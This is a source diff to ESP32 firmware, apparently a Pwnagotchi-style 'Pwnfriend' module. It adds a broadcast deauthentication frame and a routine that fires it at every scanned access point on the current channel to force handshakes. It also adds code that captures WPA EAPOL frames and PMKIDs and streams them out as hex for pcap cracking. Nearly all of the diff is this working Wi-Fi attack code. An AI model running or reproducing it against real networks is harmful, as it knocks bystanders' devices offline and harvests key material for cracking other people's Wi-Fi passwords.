@@ -61,6 +61,27 @@ static void sanitize(const char* in, char* out, size_t out_sz) {
     out[j] = '\0';
 }
 
+// Format a 6-byte MAC as "aa:bb:cc:dd:ee:ff" into out[18].
+static void fmt_mac(char* out, const uint8_t* m) {
+    static const char* hex = "0123456789abcdef";
+    int j = 0;
+    for (int i = 0; i < 6; i++) {
+        out[j++] = hex[m[i] >> 4];
+        out[j++] = hex[m[i] & 0x0f];
+        if (i < 5) out[j++] = ':';
+    }
+    out[j] = '\0';
+}
+
+// Broadcast deauth: Addr1 = ff.. (all clients), Addr2/Addr3 patched to the BSSID.
+static const uint8_t DEAUTH_TEMPLATE[26] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1: broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2: BSSID (filled)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3: BSSID (filled)
+    0xf0, 0xff, 0x02, 0x00                // seq + reason code 2
+};
+
 static bool valid_identity(const char* s) {
     int n = 0;
     for (; s[n]; n++) {
@@ -100,6 +121,8 @@ void Pwnfriend::reset() {
     _frame_len = 0;
     _ready = false;
     _sent = 0;
+    _n_recon = 0;
+    _n_pwnd_seen = 0;
 }
 
 bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
@@ -137,6 +160,8 @@ bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
             _deauth_policy = (val == "1" || val == "true");
         }
     }
+    _n_recon = 0;       // new session: forget last run's APs/pwnds
+    _n_pwnd_seen = 0;
     rebuild();
     _ready = true;
     return true;
@@ -210,6 +235,17 @@ void Pwnfriend::broadcast() {
         _sent++;
     }
 
+    // If our advertised policy is deauth, nudge every recon'd AP that lives on
+    // the channel we're currently parked on, to shake loose a handshake. We only
+    // touch same-channel APs so we never fight our own hop schedule, and we TX
+    // from the main loop (never the rx callback).
+    if (_deauth_policy) {
+        for (int i = 0; i < _n_recon; i++) {
+            if (_recon[i].channel == ch)
+                deauthAP(_recon[i].bssid);
+        }
+    }
+
     Serial.print(F("PWNFRIEND_ADV name="));
     Serial.print(_name);
     Serial.print(F(" ch="));
@@ -261,4 +297,155 @@ void Pwnfriend::reportPeer(const uint8_t* payload, int length, int rssi, int cha
     Serial.print(F(",\"deauth\":"));
     Serial.print(deauth ? F("true") : F("false"));
     Serial.println(F("}"));
+}
+
+int Pwnfriend::reconIndex(const uint8_t* bssid) const {
+    for (int i = 0; i < _n_recon; i++)
+        if (memcmp(_recon[i].bssid, bssid, 6) == 0) return i;
+    return -1;
+}
+
+bool Pwnfriend::markPwnd(const uint8_t* bssid) {
+    for (int i = 0; i < _n_pwnd_seen; i++)
+        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return false;  // already counted
+    if (_n_pwnd_seen >= MAX_PWND) return false;                  // table full: stop
+    memcpy(_pwnd_seen[_n_pwnd_seen++], bssid, 6);
+    return true;
+}
+
+void Pwnfriend::emitPwnd(const uint8_t* bssid, const char* ssid,
+                         const char* type, int channel, int rssi) {
+    char mac[18];
+    fmt_mac(mac, bssid);
+    Serial.print(F("PWNFRIEND_PWND {\"bssid\":\""));
+    Serial.print(mac);
+    Serial.print(F("\",\"ssid\":\""));
+    Serial.print(ssid);
+    Serial.print(F("\",\"type\":\""));
+    Serial.print(type);
+    Serial.print(F("\",\"channel\":"));
+    Serial.print(channel);
+    Serial.print(F(",\"rssi\":"));
+    Serial.print(rssi);
+    Serial.println(F("}"));
+}
+
+void Pwnfriend::deauthAP(const uint8_t* bssid) {
+    uint8_t f[26];
+    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
+    memcpy(f + 10, bssid, 6);   // Addr2 = BSSID
+    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
+    for (int i = 0; i < 3; i++)
+        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
+}
+
+void Pwnfriend::streamFrameHex(const uint8_t* frame, int length) {
+    if (length <= 0) return;
+    static const char* hex = "0123456789abcdef";
+    Serial.print(F("PWNFRIEND_HS "));
+    for (int i = 0; i < length; i++) {
+        Serial.write(hex[frame[i] >> 4]);
+        Serial.write(hex[frame[i] & 0x0f]);
+    }
+    Serial.println();
+}
+
+bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int channel) {
+    if (length < 38 || payload[0] != 0x80) return false;   // beacon only
+    const uint8_t* bssid = payload + 10;                    // Addr2 = BSSID (beacon)
+    if (reconIndex(bssid) >= 0) return false;               // dedup
+    if (_n_recon >= MAX_RECON) return false;                // table full
+
+    // SSID IE (tag 0x00) is the first tagged param, at offset 36.
+    char ssid[33] = {0};
+    if (payload[36] == 0x00) {
+        int slen = payload[37];
+        if (slen > 32) slen = 32;
+        if (38 + slen <= length) {
+            char raw[33];
+            for (int i = 0; i < slen; i++) raw[i] = (char)payload[38 + i];
+            raw[slen] = '\0';
+            sanitize(raw, ssid, sizeof(ssid));
+        }
+    }
+
+    memcpy(_recon[_n_recon].bssid, bssid, 6);
+    strncpy(_recon[_n_recon].ssid, ssid, sizeof(_recon[_n_recon].ssid) - 1);
+    _recon[_n_recon].ssid[sizeof(_recon[_n_recon].ssid) - 1] = '\0';
+    _recon[_n_recon].channel = (uint8_t)channel;
+    _n_recon++;
+
+    char mac[18];
+    fmt_mac(mac, bssid);
+    Serial.print(F("PWNFRIEND_AP {\"bssid\":\""));
+    Serial.print(mac);
+    Serial.print(F("\",\"ssid\":\""));
+    Serial.print(ssid);
+    Serial.print(F("\",\"channel\":"));
+    Serial.print(channel);
+    Serial.print(F(",\"rssi\":"));
+    Serial.print(rssi);
+    Serial.println(F("}"));
+    return true;
+}
+
+bool Pwnfriend::reportHandshake(const uint8_t* payload, int length, int rssi, int channel) {
+    // EAPOL ethertype 0x888e: after 802.11 hdr + LLC/SNAP at [30..31], or [32..33]
+    // when a 2-byte QoS control is present (same test Marauder's eapol path uses).
+    int eo;
+    if (length > 31 && payload[30] == 0x88 && payload[31] == 0x8e) eo = 32;
+    else if (length > 33 && payload[32] == 0x88 && payload[33] == 0x8e) eo = 34;
+    else return false;                                   // not EAPOL
+
+    streamFrameHex(payload, length);                     // full EAPOL frame -> pcap
+
+    if (eo + 6 >= length) return true;                   // EAPOL but truncated
+    if (payload[eo + 1] != 0x03) return true;            // not EAPOL-Key; still save
+
+    uint16_t key_info = (payload[eo + 5] << 8) | payload[eo + 6];
+    bool key_ack = key_info & (1 << 7);
+    bool key_mic = key_info & (1 << 8);
+    bool secure  = key_info & (1 << 9);
+
+    // BSSID from the DS bits (FromDS/ToDS in FC byte 1).
+    bool tods   = payload[1] & 0x01;
+    bool fromds = payload[1] & 0x02;
+    const uint8_t* bssid;
+    if (fromds && !tods)       bssid = payload + 10;     // AP->STA: Addr2
+    else if (!fromds && tods)  bssid = payload + 4;      // STA->AP: Addr1
+    else if (!fromds && !tods) bssid = payload + 16;     // IBSS:    Addr3
+    else                       bssid = payload + 10;     // WDS: fallback Addr2
+
+    const char* type = nullptr;
+
+    if (key_ack && !key_mic && !secure) {
+        // M1 -- look for an RSN PMKID KDE in Key Data.
+        int kdl_off = eo + 97;                           // Key Data Length (2)
+        if (kdl_off + 1 < length) {
+            int kdl = (payload[kdl_off] << 8) | payload[kdl_off + 1];
+            int kd  = kdl_off + 2;                        // Key Data start
+            int kd_end = kd + kdl;
+            if (kd_end > length) kd_end = length;
+            for (int i = kd; i + 22 <= kd_end; i++) {
+                // DD <len> 00 0F AC 04 <16-byte PMKID>
+                if (payload[i] == 0xDD &&
+                    payload[i + 2] == 0x00 && payload[i + 3] == 0x0F &&
+                    payload[i + 4] == 0xAC && payload[i + 5] == 0x04) {
+                    bool nonzero = false;
+                    for (int b = 0; b < 16; b++)
+                        if (payload[i + 6 + b]) { nonzero = true; break; }
+                    if (nonzero) type = "pmkid";
+                    break;
+                }
+            }
+        }
+    } else if (!key_ack && key_mic && !secure) {
+        type = "handshake";                              // M2: client replied
+    }
+
+    if (type && markPwnd(bssid)) {
+        int ri = reconIndex(bssid);
+        emitPwnd(bssid, (ri >= 0) ? _recon[ri].ssid : "", type, channel, rssi);
+    }
+    return true;                                         // EAPOL -> save to pcap
 }
